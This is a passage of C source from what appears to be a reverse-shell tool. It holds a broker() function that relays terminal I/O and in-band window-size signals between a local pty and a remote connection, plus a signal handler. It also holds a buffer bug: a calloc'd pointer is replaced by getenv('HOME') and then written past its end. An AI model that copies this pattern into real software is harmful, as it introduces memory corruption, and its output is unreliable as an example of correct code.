		if((rc_file_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
			fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io->listener, PATH_MAX, (int) sizeof(char), \
					strerror(errno));
			retval = -1;
			goto CLEAN_UP;
		}

		rc_file_head = getenv("HOME");

		rc_file_tail = index(rc_file_head, '\0');
		*(rc_file_tail++) = '/';	
		sprintf(rc_file_tail, REVSH_DIR);
		rc_file_tail = index(rc_file_head, '\0');
		*(rc_file_tail++) = '/';	
		sprintf(rc_file_tail, RC_FILE);


		if((rc_file_fd = open(rc_file_head, O_RDONLY)) != -1){

			while((io_bytes = read(rc_file_fd, buff_head, buff_len))){
				if(io_bytes == -1){
					fprintf(stderr, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, io->listener, \
							rc_file_fd, (unsigned long) buff_head, buff_len, strerror(errno));
					retval = -1;
					goto CLEAN_UP;
				}

				if((retval = io->remote_write(io, buff_head, io_bytes)) == -1){
					fprintf(stderr, "%s: %d: broker(): io->remote_write(%lx, %lx, %d): %s\r\n", \
							program_invocation_short_name, io->listener, \
							(unsigned long) io, (unsigned long) buff_head, io_bytes, strerror(errno));
					goto CLEAN_UP;
				}

				if(retval != io_bytes){
					fprintf(stderr, \
							"%s: %d: broker(): io->remote_write(%lx, %lx, %d): %d bytes of %d written\r\n", \
							program_invocation_short_name, io->listener, \
							(unsigned long) io, (unsigned long) buff_head, io_bytes, retval, io_bytes);
					retval = -1;
					goto CLEAN_UP;
				}

			}

			close(rc_file_fd);
		}
	}


	if((fcntl_flags = fcntl(io->remote_fd, F_GETFL, 0)) == -1){
		// XXX		error(-1, errno, "fcntl(%d, FGETFL, 0)", remote_fd);
		retval = -1;
		goto CLEAN_UP;
	}

	fcntl_flags |= O_NONBLOCK;
	if((retval = fcntl(io->remote_fd, F_SETFL, fcntl_flags)) == -1){
		// XXX		error(-1, errno, "fcntl(%d, FSETFL, %d)", remote_fd, fcntl_flags);
		retval = -1;
		goto CLEAN_UP;
	}


	// select() loop for multiplexed blocking io.
	while(1){

		if(io->encryption){
			ssl_bytes_pending = SSL_pending(io->ssl);
		}

		if(!ssl_bytes_pending){
			FD_ZERO(&fd_select);
			FD_SET(io->local_fd, &fd_select);
			FD_SET(io->remote_fd, &fd_select);

			fd_max = (io->local_fd > io->remote_fd) ? io->local_fd : io->remote_fd;

			if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) \
					&& !sig_found){
				fprintf(stderr, \
						"%s: %d: broker(): select(%d, %lx, NULL, NULL, NULL): %s\r\n", \
						program_invocation_short_name, io->listener, fd_max + 1, \
						(unsigned long) &fd_select, strerror(errno));
				goto CLEAN_UP;
			}
		}

		// Case 1: select() was interrupted by a signal that we handle.
		if(sig_found){

			current_sig = sig_found;
			sig_found = 0;

			// leaving this as a switch() statement in case I decide to
			// handle more signals later on.
			switch(current_sig){

				case SIGWINCH:
					if((retval = ioctl(io->local_fd, TIOCGWINSZ, &tty_winsize)) == -1){
						fprintf(stderr, "%s: %d: ioctl(%d, TIOCGWINSZ, %lx): %s\r\n", \
								program_invocation_short_name, io->listener, \
								io->local_fd, (unsigned long) &tty_winsize, strerror(errno));
						goto CLEAN_UP;
					}

					memset(winsize_buff_head, 0, winsize_buff_len);
					if((io_bytes = snprintf(winsize_buff_head, winsize_buff_len - 1, \
									"%c%c%hd %hd%c%c", (char) UTF8_HIGH, (char) APC, tty_winsize.ws_row, \
									tty_winsize.ws_col, (char) UTF8_HIGH, (char) ST)) < 0){
						fprintf(stderr, \
								"%s: %d: snprintf(winsize_buff_head, winsize_buff_len, \"%%c%%hd %%hd%%c\", APC, %hd, %hd, ST): %s\r\n", \
								program_invocation_short_name, io->listener, \
								tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
						retval = -1;
						goto CLEAN_UP;
					}

					if((retval = io->remote_write(io, winsize_buff_head, io_bytes)) == -1){
						fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): %s\r\n", \
								program_invocation_short_name, io->listener, \
								(unsigned long) io, (unsigned long) winsize_buff_head, io_bytes, \
								strerror(errno));
						goto CLEAN_UP;
					}

					if(retval != io_bytes){
						fprintf(stderr, \
								"%s: %d: broker(): io->remote_write(%lx, %lx, %d): %d bytes of %d written\r\n", \
								program_invocation_short_name, io->listener, (unsigned long) io, \
								(unsigned long) winsize_buff_head, io_bytes, retval, io_bytes);
						retval = -1;
						goto CLEAN_UP;
					}
					break;

				default:
					fprintf(stderr, "%s: %d: broker(): Undefined signal found: %d\r\n", \
							program_invocation_short_name, io->listener, current_sig);
					retval = -1;
					goto CLEAN_UP;
			}

			current_sig = 0;


			// Case 2: Data is ready on the local fd.
		}else if(FD_ISSET(io->local_fd, &fd_select)){

			memset(buff_head, 0, buff_len);

			if((io_bytes = read(io->local_fd, buff_head, buff_len)) == -1){
				if(!io->listener && errno == EIO){
					goto CLEAN_UP;
				}
				print_error(io, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
						program_invocation_short_name, io->listener, \
						io->local_fd, (unsigned long) buff_head, buff_len, strerror(errno));
				retval = -1;
				goto CLEAN_UP;
			}

			if(!io_bytes){
				retval = 0;
				goto CLEAN_UP;
			}

			if((retval = io->remote_write(io, buff_head, io_bytes)) == -1){
				print_error(io, "%s: %d: broker(): io->remote_write(%lx, %lx, %d): %s\r\n", \
						program_invocation_short_name, io->listener, \
						(unsigned long) io, (unsigned long) buff_head, io_bytes, strerror(errno));
				goto CLEAN_UP;
			}

			if(retval != io_bytes){
				print_error(io, \
						"%s: %d: broker(): io->remote_write(%lx, %lx, %d): %d bytes of %d written\r\n", \
						program_invocation_short_name, io->listener, \
						(unsigned long) io, (unsigned long) buff_head, io_bytes, retval, io_bytes);
				retval = -1;
				goto CLEAN_UP;
			}

			// Case 3: Data is ready on the remote fd.
		}else if(FD_ISSET(io->remote_fd, &fd_select) || ssl_bytes_pending){

			ssl_bytes_pending = 0;
			memset(buff_head, 0, buff_len);

			if((io_bytes = io->remote_read(io, buff_head, buff_len)) == -1){
				print_error(io, "%s: %d: broker(): io->remote_read(%lx, %lx, %d): %s\r\n", \
						program_invocation_short_name, io->listener, \
						(unsigned long) io, (unsigned long) buff_head, buff_len, strerror(errno));
				retval = -1;
				goto CLEAN_UP;
			}

			if(!io_bytes){
				retval = 0;
				goto CLEAN_UP;
			}

			buff_tail = buff_head + io_bytes;


			if(!io->listener && (event_ptr = strchr(buff_head, (char) UTF8_HIGH))){

				// First, clear out any data not part of the in-band signalling
				// that may be at the front of our buffer.
				tmp_len = event_ptr - buff_head;
				if((retval = write(io->local_fd, buff_head, tmp_len)) == -1){
					print_error(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, io->listener, \
							io->local_fd, (unsigned long) buff_head, tmp_len, strerror(errno));
					goto CLEAN_UP;
				}

				if(retval != tmp_len){
					print_error(io, \
							"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
							program_invocation_short_name, io->listener, \
							io->local_fd, (unsigned long) buff_head, tmp_len, retval, io_bytes);
					retval = -1;
					goto CLEAN_UP;
				}

				// At this point, either buff_head is pointing to unused space or it matches event_ptr and is already UTF8_HIGH.
				// Either way, lets put UTF8_HIGH in at buff_head[0] so we can reference it later.
				*buff_head = (char) UTF8_HIGH;

				// setup a state counter. Then retrieve next char from the appropriate place.
				state_counter = APC_HIGH_FOUND;

				// Get winsize data structures ready
				memset(winsize_buff_head, 0, winsize_buff_len);
				winsize_buff_tail = winsize_buff_head;

				while(state_counter || (event_ptr != buff_tail)){

					if(event_ptr != buff_tail){
						event_ptr++;
						tmp_char = *event_ptr;

					}else{

						// read() a char
						if((tmp_len = io->remote_read(io, &tmp_char, 1)) == -1){
							print_error(io, "%s: %d: io->remote_read(%lx, %lx, %d): %s\r\n", \
									program_invocation_short_name, io->listener, \
									(unsigned long) io, (unsigned long) &tmp_char, 1, strerror(errno));
							retval = -1;
							goto CLEAN_UP;
						}
					}

					// now we have a char, go into the state handler
					switch(state_counter){

						// Here, we found the opening APC_HIGH, but it wasn't related to an event. Further, the buffer isn't empty.
						// Consume the data, one char at a time, and make sure we don't find another event start.			
						case NO_EVENT:

							if(tmp_char == (char) UTF8_HIGH){
								state_counter = APC_HIGH_FOUND;
							}else{

								if((retval = write(io->local_fd, &tmp_char, 1)) == -1){
									print_error(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
									goto CLEAN_UP;
								}

								if(retval != 1){
									print_error(io, \
											"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, (unsigned long) &tmp_char, 1, retval, 1);
									retval = -1;
									goto CLEAN_UP;
								}
							}

							break;

							// check that we are actually in an event.
						case APC_HIGH_FOUND:

							if(tmp_char == (char) APC){
								state_counter = DATA_FOUND;

							}else{
								// damn you unicode!!!
								state_counter = NO_EVENT;

								// remember that UTF8_HIGH we stored at buff_head[0] earlier?  Yeah. :)
								if((retval = write(io->local_fd, buff_head, 1)) == -1){
									print_error(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, (unsigned long) UTF8_HIGH, 1, strerror(errno));
									goto CLEAN_UP;
								}

								if(retval != 1){
									print_error(io, \
											"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, (unsigned long) UTF8_HIGH, 1, retval, 1);
									retval = -1;
									goto CLEAN_UP;
								}

								if((retval = write(io->local_fd, &tmp_char, 1)) == -1){
									print_error(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
									goto CLEAN_UP;
								}

								if(retval != 1){
									print_error(io, \
											"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, (unsigned long) &tmp_char, 1, retval, 1);
									retval = -1;
									goto CLEAN_UP;
								}
							}

							break;

						case DATA_FOUND:

							if(tmp_char == (char) UTF8_HIGH){
								state_counter = ST_HIGH_FOUND;
							}else{
								*(winsize_buff_tail++) = tmp_char;

								if((winsize_buff_tail - winsize_buff_head) > winsize_buff_len){

									print_error(io, \
											"%s: %d: broker(): switch(%d): winsize_buff overflow.\r\n", \
											program_invocation_short_name, io->listener, state_counter);
									retval = -1;
									goto CLEAN_UP;
								}
							}
							break;

						case ST_HIGH_FOUND:

							if(tmp_char == (char) ST){

								state_counter = NO_EVENT;

								// Should have the winsize data by this point, so consume it and 
								// signal the foreground process group.
								if((winsize_vec = string_to_vector(winsize_buff_head)) == NULL){
									print_error(io, "%s: %d: broker(): string_to_vector(%s): %s\r\n", \
											program_invocation_short_name, io->listener, \
											winsize_buff_head, strerror(errno));
									retval = -1;
									goto CLEAN_UP;
								}

								if(winsize_vec[0] == NULL){
									print_error(io, \
											"%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
											program_invocation_short_name, io->listener);
									retval = -1;
									goto CLEAN_UP;
								}

								errno = 0;
								tty_winsize.ws_row = (short) strtol(winsize_vec[0], NULL, 10);
								if(errno){
									print_error(io, "%s: %d: strtol(%s): %s\r\n", \
											program_invocation_short_name, io->listener, \
											winsize_vec[0], strerror(errno));
									retval = -1;
									goto CLEAN_UP;
								}

								if(winsize_vec[1] == NULL){
									print_error(io, \
											"%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
											program_invocation_short_name, io->listener);
									retval = -1;
									goto CLEAN_UP;
								}

								errno = 0;
								tty_winsize.ws_col = (short) strtol(winsize_vec[1], NULL, 10);
								if(errno){
									print_error(io, "%s: %d: strtol(%s): %s\r\n", \
											program_invocation_short_name, io->listener, \
											winsize_vec[1], strerror(errno));
									retval = -1;
									goto CLEAN_UP;
								}

								if((retval = ioctl(io->local_fd, TIOCSWINSZ, &tty_winsize)) == -1){
									print_error(io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, TIOCGWINSZ, (unsigned long) &tty_winsize, \
											strerror(errno));
									goto CLEAN_UP;
								}

								if((sig_pid = tcgetsid(io->local_fd)) == -1){
									print_error(io, "%s: %d: tcgetsid(%d): %s\r\n", \
											program_invocation_short_name, io->listener, \
											io->local_fd, strerror(errno));
									retval = -1;
									goto CLEAN_UP;
								}

								if((retval = kill(-sig_pid, SIGWINCH)) == -1){
									print_error(io, "%s: %d: kill(%d, %d): %s\r\n", \
											program_invocation_short_name, io->listener, \
											-sig_pid, SIGWINCH, strerror(errno));
									goto CLEAN_UP;
								}

							}else{
								// The winsize data is encoded as ascii. It should never come across at UTF8_HIGH.
								// So this case will always be an error. Handle as such.
								print_error(io, \
										"%s: %d: broker(): switch(%d): high closing byte found w/out low closing byte. Should not be here!\r\n", \
										program_invocation_short_name, io->listener, state_counter);
								retval = -1;
								goto CLEAN_UP;
							}

							break;

						default:

							// Handle error case.
							print_error(io, \
									"%s: %d: broker(): switch(%d): unknown state. Should not be here!\r\n", \
									program_invocation_short_name, io->listener, state_counter);
							retval = -1;
							goto CLEAN_UP;

					}

				}

			}else{

				// Don't forget to write output for the normal case!
				if((retval = write(io->local_fd, buff_head, io_bytes)) == -1){
					print_error(io, "%s: %d: broker(): write(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, io->listener, \
							io->local_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
					goto CLEAN_UP;
				}

				if(retval != io_bytes){
					print_error(io, \
							"%s: %d: broker(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
							program_invocation_short_name, io->listener, \
							io->local_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
					retval = -1;
					goto CLEAN_UP;
				}

			}
		}
	}
	print_error(io, "%s: %d: broker(): while(1): Shouldn't ever be here.\r\n", \
			program_invocation_short_name, io->listener);
	retval = -1;

CLEAN_UP:
	free(buff_head);
	return(retval);
}



/*******************************************************************************
 * 
 * signal_handler()
 *
 * Input: The signal being handled.
 * Output: None. 
 * 
 * Purpose: To handle signals! For best effort at avoiding race conditions,
 *  we simply mark that the signal was found and return. This allows the
 *  broker() select() call to manage signal generating events.
 * 
 ******************************************************************************/
void signal_handler(int signal){
	sig_found = signal;
}

